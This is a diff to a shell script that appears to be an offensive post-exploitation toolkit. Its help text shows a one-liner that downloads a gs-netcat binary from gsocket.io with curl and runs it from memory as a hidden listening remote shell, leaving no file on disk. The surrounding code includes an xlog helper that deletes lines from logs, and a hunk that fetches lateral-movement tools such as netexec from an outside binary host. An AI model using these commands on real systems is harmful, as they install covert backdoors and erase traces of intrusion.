@@ -82,7 +82,7 @@ Examples:
 
 Or a real world example to deploy gsocket without touching the file system
 or /dev/shm or /tmp (Change the -sSECRET please):
-${CDC}GS_ARGS=\"-ilqD -s5sLosWHZLpE9riqt74KvG9\" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m))${CN}"
+${CDC}GS_ARGS=\"-ilqD -sSecretChangeMe31337\" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m))${CN}"
 }
 
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
@@ -623,6 +623,8 @@ bin() {
         local str="${single##*/}"
         local loc="${single}"
         unset single
+        [ "$str" == "cme" ] && HS_WARN "CME is obsolete. Try netexec."
+        [ "$str" == "crackmapexec" ] && HS_WARN "CrackMapExec is obsolete. Try netexec."
         bin_dl "${str}" "https://bin.ajam.dev/${a}/${loc}"
     }
     unset _HS_SINGLE_MATCH
